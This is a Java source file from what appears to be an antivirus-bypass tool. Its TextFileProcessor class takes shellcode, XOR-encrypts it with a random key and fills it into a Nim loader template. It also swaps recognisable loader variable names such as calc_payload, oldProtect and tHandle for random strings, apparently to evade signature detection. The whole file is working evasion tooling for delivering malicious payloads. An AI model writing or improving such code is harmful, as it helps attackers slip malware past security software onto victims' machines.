package com.yutian4090.bypass.utils;

import com.yutian4090.bypass.config.ApplicationProperties;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Arrays;
import java.util.List;
import java.util.Random;
@Component
public class TextFileProcessor {
    private static final int MAX_LETTER_LENGTH = 10;

    private static ApplicationProperties applicationProperties;

    @Autowired
    public void setApplicationProperties(ApplicationProperties applicationProperties) {
        TextFileProcessor.applicationProperties = applicationProperties;
    }
    public static String processTemplate(String code, String selectedTemplate) throws IOException {
        String processedCode = readTemplateFromFile(selectedTemplate);

        if (selectedTemplate.equals("x2Ldr-Plus.nim")) {
            byte[] key = generateRandomString(8).getBytes();
            code = TextFileProcessor.convertToHexStringWithPrefix(xorEncrypt(convertHexStringToByteArray(code), key));
            processedCode = processedCode.replace("{{Key}}", convertToHexStringWithPrefix(key));
        }
        System.out.println(code);

        int occurrences = countCommas(code);
        processedCode = processedCode.replace("{{Len}}", String.valueOf(occurrences + 1));
        processedCode = processedCode.replace("{{Shellcode}}", code);


        List<String> variableNamesToReplace = Arrays.asList("calc_payload", "calc_len", "calc", "rv", "th", "oldProtect", "tId", "rPtr", "wSuccess", "tHandle");

        processedCode = TextFileProcessor.replaceVariableNames(processedCode, variableNamesToReplace);

        return processedCode;
    }
    public static String readTemplateFromFile(String templateFileName) throws IOException {
        String templateFilePath = applicationProperties.getTemplatesDirectory() + templateFileName;
        System.out.println(templateFilePath);
        byte[] templateBytes = Files.readAllBytes(Paths.get(templateFilePath));
        return new String(templateBytes, StandardCharsets.UTF_8);
    }

    public static String replaceVariableNames(String code, List<String> variableNames) {
        Random random = new Random();
        String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        int variableNameLength = 8;

        for (String variableName : variableNames) {
            String generatedVariableName = generateRandomVariableName(random, characters, variableNameLength);
            code = code.replace(variableName, generatedVariableName);
        }

        return code;
    }

    private static String generateRandomVariableName(Random random, String characters, int length) {
        StringBuilder stringBuilder = new StringBuilder();
        for (int i = 0; i < length; i++) {
            int index = random.nextInt(characters.length());
            stringBuilder.append(characters.charAt(index));
        }
        return stringBuilder.toString();
    }


    public static String generateRandomFileName() {
        Random random = new Random();
        int letterLength = random.nextInt(MAX_LETTER_LENGTH) + 1;

        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < letterLength; i++) {
            char letter = (char) (random.nextInt(26) + 'a');
            sb.append(letter);
        }

        return sb.toString();
    }

    private static int countCommas(String text) {
        int count = 0;

        for (int i = 0; i < text.length(); i++) {
            if (text.charAt(i) == ',') {
                count++;
            }
        }

        return count;
    }

    public static String convertToHexStringWithPrefix(byte[] bytes) {
        StringBuilder hexString = new StringBuilder();
        for (byte b : bytes) {
            hexString.append(String.format("0x%02X, ", b));
        }

        // 移除最后一个逗号和空格
        hexString.deleteCharAt(hexString.length() - 2);
        return hexString.toString();
    }

    public static String convertToHexStringWithoutPrefix(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) {
            sb.append(String.format("%02x", b));
        }
        return sb.toString();
    }

    public static byte[] xorEncrypt(byte[] plaintext, byte[] key) {
        byte[] ciphertext = new byte[plaintext.length];
        int keyLength = key.length;
        for (int i = 0; i < plaintext.length; i++) {
            byte keyByte = key[i % keyLength];
            byte encryptedByte = (byte) (plaintext[i] ^ keyByte);
            ciphertext[i] = encryptedByte;
        }
        return ciphertext;
    }

    public static String generateRandomString(int length) {
        Random random = new Random();
        StringBuilder randomString = new StringBuilder(length);
        for (int i = 0; i < length; i++) {
            char randomChar = (char) (random.nextInt(26) + 'A'); // 生成随机大写字母
            randomString.append(randomChar);
        }
        return randomString.toString();
    }

    public static byte[] convertHexStringToByteArray(String hexString) {
        String[] hexValues = hexString.split(",\\s+"); // 按逗号和空格分割字符串
        byte[] byteArray = new byte[hexValues.length];
        for (int i = 0; i < hexValues.length; i++) {
            String hexValue = hexValues[i].trim().substring(2); // 去除前导的 "0x" 或 "0X"
            int decimalValue = Integer.parseInt(hexValue, 16); // 将十六进制值转换为整数
            byteArray[i] = (byte) decimalValue;
        }
        return byteArray;
    }
}
